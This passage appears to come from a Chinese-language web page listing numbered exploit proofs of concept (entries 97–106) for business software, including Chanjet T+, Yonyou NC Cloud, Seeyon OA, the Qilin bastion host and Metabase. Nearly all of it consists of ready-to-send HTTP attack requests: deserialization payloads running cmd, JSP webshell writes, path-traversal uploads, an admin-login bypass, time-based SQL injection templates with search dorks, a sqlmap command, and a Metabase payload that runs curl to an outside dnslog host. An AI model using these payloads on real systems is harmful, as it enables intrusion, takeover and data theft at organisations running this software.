User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,im age/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 
Cookie: JSESSIONID=4ABE9DB29CA45044BE1BECDA0A25A091.server 
Connection: close ------WebKitFormBoundaryvLTG6zlX0gZ8LzO3 
Content-Disposition:form-data;name=&quot;downloadpath&quot;; filename=&quot;a.jsp&quot; 
Content-Type: application/msword

hello 
------WebKitFormBoundaryvLTG6zlX0gZ8LzO3--
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br></div></div><h2 id="_97-用有畅捷通t-getstorewarehousebystore-rce漏洞"><a href="#_97-用有畅捷通t-getstorewarehousebystore-rce漏洞" class="header-anchor">#</a> 97.用有畅捷通T+GetStoreWarehouseByStore RCE漏洞</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>POST
/tplus/ajaxpro/Ufida.T.CodeBehind.PriorityLevel,App Code.ashx?met hod=GetstoreWarehouseByStore HTTP/1.1 Host: 
User-Agent:Mozilla/5.0 (X11;Linuxx86 64)AppleWebKit/537.36(KHTML， like
Gecko)Chrome/34.0.1847.137 Safari 4E423F 
Connection: close
Content-Length:668 
X-Ajaxpro-Method:GetstoreWarehouseByStore 
Accept-Encoding:gzip 



{ &quot;storeID&quot;:{
&quot;type&quot;:&quot;system.Windows.Data.objectDataProvider,
PresentationFramework,Version=4.0.0.0,Culture=neutral,
PublicKeyToken=31bf3856ad364e35&quot;,   
&quot;MethodName&quot;:&quot;start&quot;        
&quot;objectInstance&quot;:{        
&quot; type&quot;:&quot;system.Diagnostics.Process,        
System,Version=4.0.0.0,
Culture=neutral,
PublicKeyToken=b77a5c561934e089&quot;        
&quot;startInfo&quot;:{        
&quot; type&quot;:&quot;system.Diagnostics.ProcessstartInfo, system,
Version=4.0.0.0,Culture=neutral,
PublicKeyToken=b77a5c561934e089&quot;        
&quot;FileName&quot;:&quot;cmd&quot;,        
&quot;Arguments&quot;:&quot;/cwhoami&gt;
C:/Progra~2/Chanjet/TPlusStd/Website/2RUsL6jgx9sGX4GItBcVfxarBM.t
xt&quot;        }        } } }
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br></div></div><h2 id="_98-用友nc-cloudrce"><a href="#_98-用友nc-cloudrce" class="header-anchor">#</a> 98.用友nc-cloudRCE</h2> <p>漏洞影响</p> <p>NC63、NC633、NC65</p> <p>NC Cloud1903、NC Cloud1909</p> <p>NC Cloud2005、NC Cloud2105、NC Cloud2111</p> <p>YonBIP高级版2207</p> <p>先发送数据包，返回200</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>POST /uapjs/jsinvoke/?action=invoke HTTP/1.1
Host: 127.0.0.1:8080
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: cookiets=168170496; JSESSIONID=33A343770FF.server
If-None-Match: W/&quot;1571-1589211696000&quot;
If-Modified-Since: Mon, 11 May 2020 15:41:36 GMT
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 249

{&quot;serviceName&quot;:&quot;nc.itf.iufo.IBaseSPService&quot;,&quot;methodName&quot;:&quot;saveXStreamConfig&quot;,&quot;parameterTypes&quot;:[&quot;java.lang.Object&quot;,&quot;java.lang.String&quot;],&quot;parameters&quot;:[&quot;${param.getClass().forName(param.error).newInstance().eval(param.cmd)}&quot;,&quot;webapps/nc_web/404.jsp&quot;]}
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br></div></div><p>再发送数据包执行命令，返回命令执行结果</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>POST /404.jsp?error=bsh.Interpreter HTTP/1.1
Host: 127.0.0.1:8080
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: cookiets=1681785232226; JSESSIONID=334D3ED07A343770FF.server
If-None-Match: W/&quot;1571-1589211696000&quot;
If-Modified-Since: Mon, 11 May 2020 15:41:36 GMT
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 104

cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec(&quot;ping 8.8.8.8&quot;).getInputStream())
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br></div></div><h2 id="_99-远秋医学技能考试系统sql注入"><a href="#_99-远秋医学技能考试系统sql注入" class="header-anchor">#</a> 99.远秋医学技能考试系统SQL注入</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>sqlmap -u &quot;http://xxx.xxx.xxx.xxx/NewsDetailPage.aspx?key=news&amp;id=7&quot; -p id -batch
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><h2 id="_100-致远oa-rce"><a href="#_100-致远oa-rce" class="header-anchor">#</a> 100.致远oa rce</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>1、/seeyon/ajax.do?method=ajaxAction&amp;managerName=syncConfi
gManager
2、/seeyon/ajax.do?method=ajaxAction&amp;managerName=syncConfi
gManager&amp;requestCompress=gzip
3、/seeyon/ajax.do?method=ajaxAction&amp;managerName=syncConfi
gManager&amp;requestCompress=gzip&amp;managerMethod=checkDB&amp;argumen
ts=
4、/seeyon/ajax.do?method=ajaxAction&amp;managerName=syncConfi
gManager&amp;managerMethod=checkDB&amp;arguments=
5、/seeyon/ajax.do?method=ajaxAction&amp;managerName=syncConfi
gManager&amp;managerMethod=&amp;arguments
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><h2 id="_101-致远oa-任意文件上传"><a href="#_101-致远oa-任意文件上传" class="header-anchor">#</a> 101.致远oa 任意文件上传</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>POST 
/seeyon/wpsAssistServlet?flag=save&amp;realFileType=../../../../ApacheJetspeed/webapps/ROOT/de.jsp&amp;fileId=2
 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) 
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36
Accept: */*
Referer: 
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=5C25EFEF65A2B6A4C12848B88EA60639; loginPageURL=
Content-Type: multipart/form-data; 
boundary=59229605f98b8cf290a7b8908b34616b
Accept-Encoding: gzip
Connection: close
Content-Length: 208

--59229605f98b8cf290a7b8908b34616b
Content-Disposition: form-data; name=&quot;upload&quot;; filename=&quot;123.xls&quot;
Content-Type: application/vnd.ms-excel

&lt;% out.println(&quot;xxxx&quot;);%&gt;
--59229605f98b8cf290a7b8908b34616b--
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br></div></div><h2 id="_102-致远oa-v8-1sp2文件上传漏洞"><a href="#_102-致远oa-v8-1sp2文件上传漏洞" class="header-anchor">#</a> 102.致远OA_V8.1SP2文件上传漏洞</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>POST 
/seeyon/ajax.do?method=ajaxAction&amp;managerName=formulaManager&amp;managerMethod=saveFormula4C1loud 
 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) 
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36
Accept: */*
Referer: 
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=5C25EFEF65A2B6A4C12848B88EA60639; loginPageURL=
Content-Type: multipart/form-data; 
boundary=59229605f98b8cf290a7b8908b34616b
Accept-Encoding: gzip
Connection: close
Content-Length: 208

arguments={&quot;formulaName&quot;:&quot;test&quot;,&quot;formulaAlias&quot;:&quot;safe_pre&quot;,&quot;formulaType&quot;:&quot;2&quot;,&quot;formulaExpression&quot;:&quot;&quot;,&quot;sample&quot;:&quot;木马&quot;}
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br></div></div><h2 id="_103-致远oa任意管理员登录"><a href="#_103-致远oa任意管理员登录" class="header-anchor">#</a> 103.致远OA任意管理员登录</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>POST /seeyon/thirdpartyController.do HTTP/1.1

method=access&amp;enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&amp;clientPath=127.0.0.1
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><h2 id="_104-中远麒麟堡垒机sql注入"><a href="#_104-中远麒麟堡垒机sql注入" class="header-anchor">#</a> 104.中远麒麟堡垒机SQL注入</h2> <p>麒麟堡垒机用于运维管理的认证、授权、审计等监控管理。中远麒麟堡垒机存在SQL注入，可利用该漏洞获取系统敏感信息。</p> <p><strong>检索条件:</strong></p> <p>cert=&quot;Baolei&quot;||title=&quot;麒麟堡垒机&quot;||body=&quot;admin.php?controller=admin_index&amp;action=get_user_login_fristauth&quot;||body=&quot;admin.php?controller=admin_index&amp;action=login&quot;</p> <div class="language- line-numbers-mode"><pre class="language-text"><code> relative: req0 &amp;&amp; req1
  session: false
  requests:
  - method: POST
    timeout: 10
    path: /admin.php?controller=admin_commonuser
    headers:
      Content-Type: application/x-www-form-urlencoded
      User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML,
        like Gecko) Chrome/69.0.2786.81 Safari/537.36
    data: username=admin' AND (SELECT 6999 FROM (SELECT(SLEEP(5)))ptGN) AND 'AAdm'='AAdm
    follow_redirects: true
    matches: (code.eq(&quot;200&quot;) &amp;&amp; time.gt(&quot;5&quot;) &amp;&amp; time.lt(&quot;10&quot;))
  - method: POST
    timeout: 10
    path: /admin.php?controller=admin_commonuser
    headers:
      User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML,
        like Gecko) Chrome/69.0.2786.81 Safari/537.36
      Content-Type: application/x-www-form-urlencoded
    data: username=admin
    follow_redirects: true
    matches: time.lt(&quot;5&quot;)
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br></div></div><h2 id="_105-中远麒麟堡垒机tokens-sql"><a href="#_105-中远麒麟堡垒机tokens-sql" class="header-anchor">#</a> 105.中远麒麟堡垒机tokens SQL</h2> <div class="language- line-numbers-mode"><pre class="language-text"><code>POST /baoleiji/api/tokens HTTP/1.1


constr=1' AND (SELECT 6999 FROM (SELECT(SLEEP(5)))ptGN) AND 'AAdm' = 'AAdm'&amp;title=%40127.0.0.1 
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><h2 id="_106-metabase远程代码执行漏洞"><a href="#_106-metabase远程代码执行漏洞" class="header-anchor">#</a> 106.Metabase远程代码执行漏洞</h2> <p>CVE-2023-38646漏洞是一种高危的Metabase远程代码执行漏洞。Metabase是一个开源的数据分析和可视化工具，可以帮助用户连接到各种数据源，并进行数据查询、分析和可视化。</p> <p>工具链接</p> <p><code>https://github.com/robotmikhro/CVE-2023-38646</code></p> <p><strong>漏洞描述</strong></p> <p>Metabase是一个开源的数据分析和可视化工具，它可以帮助用户轻松连接到各种数据源，包括数据库、云服务和API，然后使用绘图的界面进行数据查询、分析和可视化。需身份认证的远程攻击者利用该漏洞可以在服务器上以运行元数据库服务器的权限执行任意命令</p> <p><strong>漏洞影响</strong></p> <p>元数据库</p> <p><strong>网络测绘</strong></p> <p>应用程序=“元数据库”</p> <p>POC</p> <p>/api/session/properties</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>POST /api/setup/validate HTTP/1.1
Host: 
Content-Type: application/json
Content-Length: 812

{
    &quot;token&quot;: &quot;e56e2c0f-71bf-4e15-9879-d964f319be69&quot;,
    &quot;details&quot;:
    {
        &quot;is_on_demand&quot;: false,
        &quot;is_full_sync&quot;: false,
        &quot;is_sample&quot;: false,
        &quot;cache_ttl&quot;: null,
        &quot;refingerprint&quot;: false,
        &quot;auto_run_queries&quot;: true,
        &quot;schedules&quot;:
        {},
        &quot;details&quot;:
        {
            &quot;db&quot;: &quot;zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('curl ecw14d.dnslog.cn')\n$$--=x&quot;,
            &quot;advanced-options&quot;: false,
            &quot;ssl&quot;: true
        },
        &quot;name&quot;: &quot;an-sec-research-team&quot;,
        &quot;engine&quot;: &quot;h2&quot;
    }
}
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br></div></div></div> <footer class="page-edit"><!----> <!----></footer> <!----> </main></div><div class="global-ui"></div></div>
    <script src="/assets/js/app.7b029d36.js" defer></script><script src="/assets/js/2.6bfae921.js" defer></script><script src="/assets/js/1.4a50f8bd.js" defer></script><script src="/assets/js/22.0e4ee2ee.js" defer></script>
  </body>
</html>
